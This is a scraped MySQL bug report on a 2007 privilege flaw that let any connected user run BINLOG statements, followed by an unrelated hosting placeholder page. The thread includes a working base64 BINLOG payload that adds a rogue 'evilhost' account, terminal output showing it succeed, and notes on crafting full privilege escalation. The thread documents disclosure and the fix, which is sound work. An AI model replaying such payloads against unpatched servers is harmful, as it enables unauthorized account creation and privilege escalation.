=== Content from bugs.mysql.com_5d28c3c3_20250125_062243.html ===

[![MySQL](/images/mysql_100x52-64.gif)](http://dev.mysql.com/)

[Login](https://dev.mysql.com/auth/login/?dest=http%3A%2F%2Fbugs.mysql.com%2Fbug.php%3Fid%3D31611) /
[Register](https://dev.mysql.com/auth/register/)

* [Developer Zone](http://dev.mysql.com/)
* [Bugs Home](/)
* [Report a bug](/report.php)
* [Advanced search](/search.php)
* [Saved searches](/search-saved.php)
* [Tags](/tags.php)

| Bug #31611 | Security risk with BINLOG statement | | |
| --- | --- | --- | --- |
| Submitted: | 15 Oct 2007 13:59 | Modified: | 17 Jan 2008 16:35 |
| Reporter: | [Lars Thalmann](/search.php?cmd=display&status=All&severity=all&reporter=33114) | Email Updates: |  |
| Status: | Closed | Impact on me: | None |
| Category: | MySQL Server: Row Based Replication ( RBR ) | Severity: | S1 (Critical) |
| Version: | 5.1 | OS: | Any |
| Assigned to: | [Mats Kindahl](/search.php?cmd=display&status=Under+Development&assign=164359) | CPU Architecture: | Any |
| Tags: | [BINLOG statement](/search.php?cmd=display&status=Active&tags=BINLOG%20statement), [privileges](/search.php?cmd=display&status=Active&tags=privileges) | | |

* View
* [Add Comment](/bug.php?id=31611&edit=3)
* [Files](/bug.php?id=31611&files=1)
* [Developer](/bug.php?id=31611&edit=1)
* [Edit Submission](/bug.php?id=31611&edit=2)
* [View Progress Log](/bug.php?id=31611&log=1)
* [Contributions](/bug.php?id=31611&contribs=1)

[15 Oct 2007 13:59]
Lars Thalmann
```
Description:
There is no check that the executor on BINLOG statements
have correct rights.

How to repeat:
Code review

Suggested fix:
Check that BINLOG executor has ROOT privileges.
```

[24 Oct 2007 14:24]
Lars Thalmann
```
PROBLEM: DML
--------------
I think that *any* user can execute BINLOG statements and that the is
no check for root only.  At least I can't find any check in the code.
Even SQLCOM_INSERT has checks for privileges (in insert_precheck()
function).
```

[2 Nov 2007 12:17]
Domas Mituzas
```
BINLOG '
iA0rRxMrAgAAmQAAAN0MAAAAAAIAAAAAAAAABW15c3FsAAR1c2VyACf+/v7+/v7+/v7+/v7+/v7+
/v7+/v7+/v7+/v7+/v7+/vz8/AMDAwND/rT+MP4p9wH3AfcB9wH3AfcB9wH3AfcB9wH3AfcB9wH3
AfcB9wH3AfcB9wH3AfcB9wH3AfcB9wH3AfcB9wH3AQICAgAAAAAA
iA0rRxcrAgAAkgAAAG8NAAAQAAIAAAAAAAEAJ///////AAAAAIAIZXZpbGhvc3QFZG9tYXMpKjND
OEFDQTE5MUQ3QzdEQ0YyMTA2NkFBRTdFRjM2REE0MjYxOTkzNUECAQEBAQEBAQEBAQEBAQEBAQEB
AQEBAQEBAQEBAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
'/*!*/;
```

[2 Nov 2007 12:26]
Domas Mituzas
```
This allows any connected user to get any privileges they want, edit any data they want, etc.
```

[2 Nov 2007 12:30]
Domas Mituzas
```
The BINLOG statement above creates a user 'domas' which can connect from 'evilhost' by typing 'muhaha' or something similar as a password, and has global select privileges. The statement can be executed at any privilege level - connectivity to server is the only requirement.

Crafting such attack is very easy - one just has to enable row-level binlogging, add a row on 'test' instance, copy-paste the binlog output and run it against target server. It needs trivial mysql or system skills.
```

[2 Nov 2007 18:33]
MySQL Verification Team
```
This is a procedure to repeat the security bug:

1. Login to server with user who only has SELECT privilege over mysql database. This is needed only to verify a bug. It is not needed to exploit the bug !!!!
To exploit the bug you do not need ANY privileges as BINLOG command can be executed by anyone. This is a crux of the bug.
2. Run: SELECT * FROM mysql.user;
3. Run: BINLOG '
iA0rRxMrAgAAmQAAAN0MAAAAAAIAAAAAAAAABW15c3FsAAR1c2VyACf+/v7+/v7+/v7+/v7+/v7+
/v7+/v7+/v7+/v7+/v7+/vz8/AMDAwND/rT+MP4p9wH3AfcB9wH3AfcB9wH3AfcB9wH3AfcB9wH3
AfcB9wH3AfcB9wH3AfcB9wH3AfcB9wH3AfcB9wH3AQICAgAAAAAA
iA0rRxcrAgAAkgAAAG8NAAAQAAIAAAAAAAEAJ///////AAAAAIAIZXZpbGhvc3QFZG9tYXMpKjND
OEFDQTE5MUQ3QzdEQ0YyMTA2NkFBRTdFRjM2REE0MjYxOTkzNUECAQEBAQEBAQEBAQEBAQEBAQEB
AQEBAQEBAQEBAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
'/*!*/;
4. re-start server
5. Login to server with user who only has SELECT privileges over mysql database.
6. Run: SELECT * FROM mysql.user;
```

[2 Nov 2007 18:37]
Mark Leith
```
mysql> select user, host, password from mysql.user;
+-------+-----------+-------------------------------------------+
| user  | host      | password                                  |
+-------+-----------+-------------------------------------------+
| root  | localhost |                                           |
| root  | medusa    |                                           |
| root  | 127.0.0.1 |                                           |
| repl  | %         | *A424E797037BF97C19A2E88CF7891C5C2038C039 |
+-------+-----------+-------------------------------------------+
4 rows in set (0.04 sec)

mysql> BINLOG '
    '> iA0rRxMrAgAAmQAAAN0MAAAAAAIAAAAAAAAABW15c3FsAAR1c2VyACf+/v7+/v7+/v7+/v7+/v7+
    '> /v7+/v7+/v7+/v7+/v7+/vz8/AMDAwND/rT+MP4p9wH3AfcB9wH3AfcB9wH3AfcB9wH3AfcB9wH3
    '> AfcB9wH3AfcB9wH3AfcB9wH3AfcB9wH3AfcB9wH3AQICAgAAAAAA
    '> iA0rRxcrAgAAkgAAAG8NAAAQAAIAAAAAAAEAJ///////AAAAAIAIZXZpbGhvc3QFZG9tYXMpKjND
    '> OEFDQTE5MUQ3QzdEQ0YyMTA2NkFBRTdFRjM2REE0MjYxOTkzNUECAQEBAQEBAQEBAQEBAQEBAQEB
    '> AQEBAQEBAQEBAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
    '> '/*!*/;
Query OK, 0 rows affected (0.02 sec)

mysql> select user, host, password from mysql.user;
+-------+-----------+-------------------------------------------+
| user  | host      | password                                  |
+-------+-----------+-------------------------------------------+
| root  | localhost |                                           |
| root  | medusa    |                                           |
| root  | 127.0.0.1 |                                           |
| repl  | %         | *A424E797037BF97C19A2E88CF7891C5C2038C039 |
| domas | evilhost  | *3C8ACA191D7C7DCF21066AAE7EF36DA42619935A |
+-------+-----------+-------------------------------------------+
5 rows in set (0.04 sec)
```

[2 Nov 2007 19:49]
Jeffrey Pugh
```
A slightly extended test case with output:

C:\Documents and Settings\Jeffrey Pugh>mysql -uroot -p
Enter password:
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 3
Server version: 5.1.22-rc-community MySQL Community Server (GPL)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.
mysql> create user jeffrey;
Query OK, 0 rows affected (0.02 sec)
mysql> grant usage on mysql.* to 'jeffrey';
Query OK, 0 rows affected (0.02 sec)

mysql> exit;
C:\Documents and Settings\Jeffrey Pugh>mysql -ujeffrey -p
Enter password:
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 2
Server version: 5.1.22-rc-community MySQL Community Server (GPL)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql> tee 31611a
Logging to file '31611a'
mysql> use mysql;
ERROR 1044 (42000): Access denied for user 'jeffrey'@'%' to database 'mysql'
mysql> BINLOG '
    '> iA0rRxMrAgAAmQAAAN0MAAAAAAIAAAAAAAAABW15c3FsAAR1c2VyACf+/v7+/v7+/v7+/v7+/
v7+
    '> /v7+/v7+/v7+/v7+/v7+/vz8/AMDAwND/rT+MP4p9wH3AfcB9wH3AfcB9wH3AfcB9wH3AfcB9
wH3
    '> AfcB9wH3AfcB9wH3AfcB9wH3AfcB9wH3AfcB9wH3AQICAgAAAAAA
    '> iA0rRxcrAgAAkgAAAG8NAAAQAAIAAAAAAAEAJ///////AAAAAIAIZXZpbGhvc3QFZG9tYXMpK
jND
    '> OEFDQTE5MUQ3QzdEQ0YyMTA2NkFBRTdFRjM2REE0MjYxOTkzNUECAQEBAQEBAQEBAQEBAQEBA
QEB
    '> AQEBAQEBAQEBAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
    '> '/*!*/;
Query OK, 0 rows affected (0.00 sec)

mysql> select * from user;
ERROR 1046 (3D000): No database selected
mysql> exit
Bye

C:\Documents and Settings\Jeffrey Pugh>mysql -uroot -p
Enter password:
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 3
Server version: 5.1.22-rc-community MySQL Community Server (GPL)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.
mysql> use mysql;
Database changed
mysql> select * from user;
+----------------------+---------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+
| Host                 | User    | Password                                  | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | Create_view_priv | Show_view_priv | Create_routine_priv | Alter_routine_priv | Create_user_priv | Event_priv | Trigger_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections | max_user_connections |
+----------------------+---------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+
| localhost            | root    |                                           | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            |          |            |             |              |             0 |           0 |               0 |                    0 |
| production.mysql.com | root    |                                           | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            |          |            |             |              |             0 |           0 |               0 |                    0 |
| 127.0.0.1            | root    |                                           | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            |          |            |             |              |             0 |           0 |               0 |                    0 |
| %                    | jeffrey |                                           | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            |          |            |             |              |             0 |           0 |               0 |                    0 |
| evilhost             | domas   | *3C8ACA191D7C7DCF21066AAE7EF36DA42619935A | Y           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            |          |            |             |              |             0 |           0 |               0 |                    0 |
+----------------------+---------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+
5 rows in set (0.00 sec)

mysql> exit

In the above example, even a user with only connect privileges can still create add a user to the database using the provided BINLOG command. A more sophisticated user (who knows how to create and capture the binlog output) could do (presumably) anything.
```

[2 Nov 2007 20:30]
Jeffrey Pugh
```
btw, the above test cases are not examples of "This allows any connected user to get any privileges they want, edit any data they want". For that, you would generate the BINLOG output for (say) "GRANT ALL ON *.* TO 'someuser'@'somehost';"
```

[2 Nov 2007 20:57]
Mats Kindahl
```
I am about to submit a patch that will prevent anybody that do not have SUPER privileges from executing the BINLOG statement.  I decided on using SUPER privileges instead of REPLICATION CLIENT privileges (which has been mentioned) since the REPLICATION CLIENT is only used to get status using the commands SHOW MASTER STATUS and SHOW SLAVE STATUS. This means that the privilege potentially can be granted to users that are allowed to watch the status of replication (e.g., Merlin or a human "watcher"), but not necessarily anything else. Allowing these users to execute potentially very dangerous commands that actually can change data in the databases defeats the purpose of the privileges, so I decided that SUPER is more appropriate.
```

[2 Nov 2007 20:58]
Kolbe Kegel
```
Also from email, in reply to Jeffrey,

> > btw, I think your statement "Bug allows *any* user to get access...." is
> > open to misinterpretation; it allows any *connected database user* to do
> > so (i.e. they can login to the database server) - Domas provides this
> > clarification further down in the bug.

Do note that, by default, MySQL will allow pretty much anybody to
connect... (anonymous user, etc.) so, out of the box, every single MySQL
5.1 install is susceptible to remote hijacking via this bug, unless and
until it's been locked down.

> > For example, the bugs database is accessed through web forms that proxy
> > the database username/password, but actual connections to the database
> > server are allowed only from on the MySQL VPN.

Indeed. However, this bug turns what could be a relatively benign SQL
injection for a locked-down (read-only) account into an unbounded
privilege escalation issue.
```

[3 Nov 2007 14:23]
Domas Mituzas
```
I suggest having a configuration parameter (not SET'able), that allows user-supplied BINLOG.
Usually if anyone is rolling forward, can afford SUPER to have complete access rights to whole server.
In proper operation nobody would ever need to execute BINLOG.
```

[5 Nov 2007 10:09]
Lars Thalmann
```
Update:

The fix is ready and reviewed since Friday night and next action is
for Daniel to figure out which tree to push this into.

(Serg probably want to review the patch too, but I don't see any
problem with it.)

Special thanks to Mats for speedient fix already on Friday night.
```

[5 Nov 2007 12:53]
Mats Kindahl
```
Patch pushed into mysqldev@production:/data0/mysqldev/my/mysql-5.1-release
```

[8 Nov 2007 10:31]
Bugs System
```
Pushed into 5.1.23-rc
```

[12 Nov 2007 10:38]
Bugs System
```
Pushed into 5.1.23-rc
```

[12 Nov 2007 12:06]
Bugs System
```
Pushed into 6.0.4-alpha
```

[14 Nov 2007 19:36]
Sergei Golubchik
```
CVE-2007-5968
```

[28 Nov 2007 20:45]
Omer Barnir
```
Root Cause Analysis
-------------------
As stated above the problem's origination is with the initial design (BINLOG command can be executed by anyone). We do not have privilege tests that check for this angle of usgae
```

[11 Dec 2007 23:16]
Sergei Golubchik
```
CVE-2007-6313
(not the CVE number that I've mentioned earlier, don't use that!)
```

[17 Jan 2008 16:35]
Jon Stephens
```
Documented fix in 5.1.23 and 6.0.4 changelogs.
```

* [Legal Policies](http://www.mysql.com/about/legal/)
* [Your Privacy Rights](http://www.oracle.com/us/legal/privacy/index.htm)
* [Terms of Use](http://www.oracle.com/html/terms.html)
* [Contact Us](https://www.mysql.com/about/contact/)

Portions of this website are [copyright © 2001, 2002 The PHP Group](http://www.php.net/copyright.php)

Page generated in 0.078 sec. using MySQL 8.0.36-u5-cloud

Timestamp references displayed by the system are UTC.

Content reproduced on this site is the property of the
respective copyright holders.
It is not reviewed in advance
by Oracle and does not necessarily represent the opinion of
Oracle or any other party.

[![Oracle](/images/logo-oracle-red-91x22.gif)](http://www.oracle.com/)  © 2025, Oracle Corporation and/or its affiliates



=== Content from www.vupen.com_51bffbc9_20250125_062244.html ===

[![](/__ovh/common/img/logo-white.png)](https://www.ovhcloud.com/)

![](/__ovh/common/img/icon-traffic-cone.png)

# Site en construction

![](/__ovh/common/img/shadow.png)

Besoin d'assistance ou d'informations ?

[![](/__ovh/common/img/icon-book.png)
Guides](https://docs.ovh.com/fr/hosting/ "Guides")
[![](/__ovh/common/img/icon-speech-bubble.png)
Forum](https://community.ovh.com/ "Forum")
[![](/__ovh/common/img/icon-user-support.png)
Contact](https://help.ovhcloud.com/fr/ "Contact")
[![](/__ovh/common/img/icon-app-gear.png)
Espace Client](https://www.ovh.com/manager/ "Espace Client")

© Copyright 1999 [OVHcloud](https://www.ovhcloud.com/)

v1v2v3v4v5v6v7v8v9v10v11v12v13v14v15v16v17v18v19v20v21v22v23v24v25v26v27v28v29v30v31v32v33v34v35v36v37v38v39v40v41v42v43v44v45v46v47v48v49v50v51v52v53v54v55v56v57v58v59v60v61v62v63v64v65v66v67v68v69v70

u1u2u3u4u5u6u7u8u9u10u11u12u13u14u15u16u17u18u19u20u21u22u23u24u25u26u27u28u29u30u31u32u33u34u35u36u37u38u39u40u41u42u43u44u45u46u47u48u49u50u51u52u53u54u55u56u57u58u59u60u61u62u63u64u65u66u67u68u69

p1p2p3p4p5p6p7p8p9p10p11p12p13p14p15p16p17p18p19p20p21p22p23p24p25p26p27p28p29p30p31p32p33p34p35p36p37p38p39p40p41p42p43p44p45p46p47p48p49p50p51p52p53p54p55p56p57p58p59p60p61p62p63p64

e1e2e3e4e5e6e7e8e9e10e11e12e13e14e15e16e17e18e19e20e21e22e23e24e25e26e27e28e29e30e31e32e33e34e35e36e37e38e39e40e41e42e43e44e45e46e47e48e49e50e51e52e53

n1n2n3n4n5n6n7n8n9n10n11n12n13n14n15n16n17n18n19n20n21n22n23n24n25n26n27n28n29n30n31n32n33n34n35n36n37n38n39n40n41n42n43n44n45n46n47n48n49n50n51n52n53n54n55n56n57n58n59n60n61n62

---

c1c2c3c4c5c6c7c8c9c10c11c12c13c14c15c16c17c18c19c20c21c22c23c24c25c26c27c28c29c30c31c32c33c34c35c36c37c38c39c40c41c42c43c44c45c46c47c48c49c50c51

o1o2o3o4o5o6o7o8o9o10o11o12o13o14o15o16o17o18o19o20o21o22o23o24o25o26o27o28o29o30o31o32o33o34o35o36o37o38o39o40o41o42o43o44o45o46o47o48o49o50o51o52o53o54o55o56o57o58o59o60o61o62o63

m1m2m3m4m5m6m7m8m9m10m11m12m13m14m15m16m17m18m19m20m21m22m23m24m25m26m27m28m29m30m31m32m33m34m35m36m37m38m39m40m41m42m43m44m45m46m47m48m49m50m51m52m53m54m55m56m57m58m59m60m61


